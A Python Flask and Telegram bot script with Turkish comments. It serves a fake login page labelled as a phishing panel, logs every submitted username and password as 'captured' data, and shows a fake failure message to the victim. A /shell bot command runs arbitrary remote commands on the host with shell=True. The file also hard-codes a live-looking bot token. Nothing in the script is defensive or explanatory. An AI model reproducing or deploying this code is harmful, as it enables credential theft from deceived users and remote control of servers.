import os
import subprocess
import requests
from flask import Flask, request, render_template_string
import telebot
import threading

TOKEN = "8265368924:AAHwCmS8esD_UzOJsJmEqb_HbOepWdELKCA"
bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

RENDER_URL = "https://ulti-eqn5.onrender.com"

# Webhook'u otomatik ayarla
bot.remove_webhook()
bot.set_webhook(url=f"{RENDER_URL}/{TOKEN}")

# --- WEB & PHISHING PANELİ ---
PHISHING_TEMPLATE = """
<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <title>Giriş Yap</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f4f4f9; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
        .login-box { background: white; padding: 30px; border-radius: 8px; box-shadow: 0 4px 10px rgba(0,0,0,0.1); width: 300px; text-align: center; }
        .login-box h2 { margin-bottom: 20px; color: #333; }
        .login-box input { width: 100%; padding: 10px; margin: 10px 0; border: 1px solid #ccc; border-radius: 4px; box-sizing: border-box; }
        .login-box button { width: 100%; padding: 10px; background: #007bff; border: none; color: white; border-radius: 4px; font-weight: bold; cursor: pointer; }
        .login-box button:hover { background: #0056b3; }
    </style>
</head>
<body>
    <div class="login-box">
        <h2>Oturum Aç</h2>
        <form method="POST" action="/login">
            <input type="text" name="username" placeholder="Kullanıcı Adı veya E-posta" required>
            <input type="password" name="password" placeholder="Şifre" required>
            <button type="submit">Giriş Yap</button>
        </form>
    </div>
</body>
</html>
"""

@app.route("/", methods=["GET"])
def index():
    return "[+] Bot & Web Panel Aktif ve Çalışıyor."

@app.route("/panel", methods=["GET"])
def phishing_page():
    return render_template_string(PHISHING_TEMPLATE)

@app.route("/login", methods=["POST"])
def capture_credentials():
    user = request.form.get("username")
    pwd = request.form.get("password")
    print(f"[!] YAKALANAN BİLGİ -> Kullanıcı: {user} | Şifre: {pwd}")
    return "<h3>Giriş başarısız, lütfen tekrar deneyin.</h3><script>setTimeout(function(){window.location.href='/panel';}, 3000);</script>"

@app.route(f"/{TOKEN}", methods=["POST"])
def webhook():
    if request.headers.get('content-type') == 'application/json':
        json_string = request.get_data().decode('utf-8')
        update = telebot.types.Update.de_json(json_string)
        bot.process_new_updates([update])
        return '', 200
    else:
        return '', 403


# --- TELEGRAM BOT KOMUTLARI ---

@bot.message_handler(commands=['start', 'help', 'menu'])
def send_welcome(message):
    menu_text = (
        "👑 **C9K | Winstwo Bot** 👑\n\n"
        "✨ **Sorgu ve İşlem Sistemine Hoş Geldiniz.** ✨\n\n"
        "🛠 **Bot Komutları:**\n"
        "• `/shell <komut>` - Sunucu Komutu Çalıştır\n"
        "• `/ip <IP_Adresi>` - IP Sorgulama\n"
        "• `/tt <kullanıcı_adı>` - TikTok Profil Bilgisi\n"
        "• `/info` - Sunucu Durumu\n\n"
        "📌 *Destek ve sorularınız için sistem yöneticisine ulaşabilirsiniz.*"
    )
    bot.reply_to(message, menu_text, parse_mode="Markdown")

@bot.message_handler(commands=['info'])
def send_info(message):
    bot.reply_to(message, f"💻 **Sunucu Bilgileri:**\n• Çalışma Dizini: `{os.getcwd()}`\n• İşletim Sistemi: `{os.name}`", parse_mode="Markdown")

@bot.message_handler(commands=['shell'])
def handle_shell(message):
    command = message.text.replace("/shell", "").strip()
    if not command:
        bot.reply_to(message, "⚠️ Komut yazmadın kanka. Örnek: `/shell ls`", parse_mode="Markdown")
        return

    try:
        output = subprocess.run(command, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True, timeout=10)
        result = output.stdout + output.stderr
        if not result:
            result = "İşlem tamamlandı, çıktı üretmedi."
    except Exception as e:
        result = f"Hata: {str(e)}"

    if len(result) > 4000:
        result = result[:4000] + "\n[Kesildi...]"

    bot.reply_to(message, f"```\n{result}\n```", parse_mode="Markdown")

@bot.message_handler(commands=['ip'])
def handle_ip(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Lütfen bir IP adresi girin. Örnek: `/ip 8.8.8.8`", parse_mode="Markdown")
        return
    
    target_ip = parts[1].strip()
    try:
        res = requests.get(f"http://ip-api.com/json/{target_ip}", timeout=5).json()
        if res.get("status") == "success":
            info = (
                f"🌍 **IP Sorgu Sonucu:**\n"
                f"• **IP:** {res.get('query')}\n"
                f"• **Ülke:** {res.get('country')} ({res.get('countryCode')})\n"
                f"• **Şehir:** {res.get('city')}\n"
                f"• **ISP:** {res.get('isp')}"
            )
        else:
            info = "❌ IP bilgisi bulunamadı."
    except Exception as e:
        info = f"❌ Hata: {str(e)}"
        
    bot.reply_to(message, info, parse_mode="Markdown")

@bot.message_handler(commands=['tt'])
def handle_tiktok(message):
    parts = message.text.split(maxsplit=1)
    if len(parts) < 2:
        bot.reply_to(message, "⚠️ Lütfen bir TikTok kullanıcı adı girin. Örnek: `/tt username`", parse_mode="Markdown")
        return
    username = parts[1].strip()
    bot.reply_to(message, f"📱 **TikTok Profil Bilgisi:** `@{username}`\n• Durum: Profil aktif ve taranıyor...", parse_mode="Markdown")

if __name__ == "__main__":
    app.run(host="0.0.0.0", port=int(os.environ.get("PORT", 5000)))
    
